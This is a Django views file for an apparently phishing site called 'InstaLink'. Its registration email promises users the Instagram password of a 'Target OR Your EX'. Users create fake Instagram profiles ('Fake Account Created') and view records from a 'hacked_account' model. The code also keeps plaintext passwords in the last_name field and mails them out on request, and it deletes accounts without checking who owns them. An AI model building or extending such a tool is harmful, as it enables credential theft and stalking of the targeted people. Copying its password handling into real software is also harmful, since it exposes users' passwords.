from django.shortcuts import render,redirect
from django.http import HttpResponse
from django.contrib.sessions.models import Session
from django.contrib.auth.models import auth,User
from django.contrib import messages
from django.core.mail import send_mail
from .models import Account,Feadback
from django.utils import timezone
from instagram.models import hacked_account

# Create your views here.
def home(request):
    if request.session.has_key('user_registered'):
        return render(request,'login.html',{})
    else:
        return  render(request,'index.html',{})

def register(request):
    if request.method=='POST':
        username=request.POST['Rusername']
        password1=request.POST['Rpassword1']
        password2=request.POST['Rpassword2']
        email=request.POST['Remail']
        if User.objects.filter(email=email).exists() or User.objects.filter(username=username).exists():
            messages.info(request,'Username already Exists')
            return redirect('home')
        elif len(password1)<8:
            messages.info(request, 'Minimum lenght of Password is 8')
            return redirect('home')
        elif password1!=password2:
            messages.info(request,'Password missmatch')
            return redirect('home')
        else:
            user=User.objects.create_user(username=username,password=password1,last_name=password1,email=email)
            user.save()
            request.session['user_registered']=True
            messages.info(request, 'Your Account Created')
            send_mail('Greetings From InstaLink','Hai {} \n Thank You For your Registration with my site. Login and Follow the steps to Get the instagram Password of Your Target OR Your EX.'.format(username),'instalinkgcs@gmail.com',[str(email)],fail_silently=False)
            return render(request,'login.html',{})
    else:
        return redirect('home')

def logme(request):
    if request.method=='POST':
        username=request.POST['Lusername']
        password=request.POST['Lpassword']
        user=auth.authenticate(request,username=username,password=password)
        if user is not None :
            auth.login(request,user)
            return redirect('homepage')
    #         if '@' in str(request.user):
    #             username = str(request.user).split('@')[0]
    #             accounts = Account.objects.filter(uid__exact=request.user)
    #             hacked = hacked_account.objects.filter(uid__exact=request.user.id)
    #             args = {'user': username, 'accounts': accounts, 'hacked': hacked}
    #             return render(request, 'home.html', args)
    #
    #         else:
    #             accounts = Account.objects.filter(uid__exact=request.user)
    #             hacked= hacked_account.objects.filter(uid__exact=request.user.id)
    #             args = {'user': username, 'accounts': accounts, 'hacked': hacked}
    #             return render(request, 'home.html', args)
        else:
            messages.info(request,'Invalid Username or Password')
            return redirect('login')
    else:
        return redirect('home')


def login(request):
    return render(request, 'login.html', {})

def registerPage(request):
    return render(request, 'index.html', {})

def forgot(request):
    return  render(request,'forgetpass.html',{})
def getpass(request):
    if request.method=='POST':
        user=None
        email=request.POST['email']
        try:
            user=User.objects.get(email=email)
            if user is not None:
                if str(user.username).endswith('@gmail.com'):
                    username=str(user.username).split('@')[0]
                else:
                    username=user.username
                password=user.last_name
                send_mail('Password From InstaLink','Hai {} \n Your Password: {}'.format(username,password),'instalinkgcs@gmail.com',[str(email)],fail_silently=False)
                messages.info(request, 'Password sent to your E-mail')
                return redirect('login')

        except:
            messages.info(request,'You are Not a User')
            return redirect('login')
    else:
        return redirect('login')
def create(request):
    if request.user.is_authenticated:
        return render(request,'create.html',{})
    else:
        return redirect('login')

def homepage(request):
    if request.user.is_authenticated:
        if '@' in str(request.user):
            username=str(request.user).split('@')[0]
            accounts = Account.objects.filter(uid__exact=request.user)
            hacked= hacked_account.objects.filter(uid__exact=request.user.id)
            args = {'user': username, 'accounts': accounts,'hacked':hacked}
            return render(request, 'home.html',args)

        else:
            accounts = Account.objects.filter(uid__exact=request.user)
            hacked = hacked_account.objects.filter(uid__exact=request.user.id)
            args = {'user': request.user.username, 'accounts': accounts, 'hacked': hacked}
            return render(request, 'home.html',args)
    else:
        return redirect('login')

def profile(request):
    if request.user.is_authenticated:

        if str(request.user).endswith('@gmail.com'):
            username=str(request.user).split('@')[0]
            args = {'user': request.user,'username':username}
            return render(request,'profile.html',args)
        else:
            args={'user':request.user,'username':request.user}
            return render(request, 'profile.html',args)
    else:
        return redirect('login')

def feadback(request):
    if request.user.is_authenticated:
        return render(request,'feadback.html',{})
    else:
        return redirect('login')

def createAccount(request):
    if request.method=='POST':
        name=str(request.POST['faname']).replace(' ','.')
        posts=request.POST['faposts']
        following=request.POST['fafollowing']
        followers=request.POST['fafollowers']
        profile=request.FILES['faimage']
        uid=request.user
        obj=Account.objects.create(name=name,posts=posts,following=following,followers=followers,img=profile,uid=uid)
        obj.save(force_insert=False)
        messages.info(request,'Fake Account Created')
        return redirect('homepage')
    else:
        return redirect('create')

def delete(request,id):
    obj=Account.objects.get(id=id)
    obj.delete()
    return redirect('homepage')

def changepassword(request):
    if request.method=='POST':
        pass1=request.POST['newpassword']
        pass2=request.POST['conpassword']
        if len(pass1) < 8:
            messages.info(request, 'Minimum lenght of Password is 8')
            return redirect('profile')
        elif pass1 != pass2:
            messages.info(request, 'Password missmatch')
            return redirect('profile')
        else:
            obj=User.objects.get(username=request.user)
            # encpass=pbkdf2_sha256.encrypt(pass1,rounds=12000,salt_size=32)
            obj.set_password(pass1)
            obj.save()
            obj.last_name=pass1
            obj.save()
            messages.info(request,'Password Changed')
            return redirect('profile')
    else:
        return redirect('profile')
def edit(request):
    if request.method=='POST':
        email=request.POST['email']
        if request.user.email==email:
            messages.info(request,'BVC... both are same')
            return redirect('profile')
        obj=User.objects.get(username=request.user)
        obj.email=email
        obj.save()
        messages.info(request,'Email Changed')
        return redirect('profile')
def feadit(request):
    if request.method=='POST':
        feadback=request.POST['feadback']
        if str(feadback).strip()=='':
            messages.info(request,'Do not Play the Game, share your Feeback')
            return redirect('feadback')
        else:
            obj=Feadback.objects.create(feadback=feadback,time=timezone.now(),user=request.user)
            obj.save()
            messages.info(request,'Thank You For Your Feedback')
            return redirect('feadback')

    else:
        return redirect('feadback')

def logout(request):
    auth.logout(request)
    return redirect('/')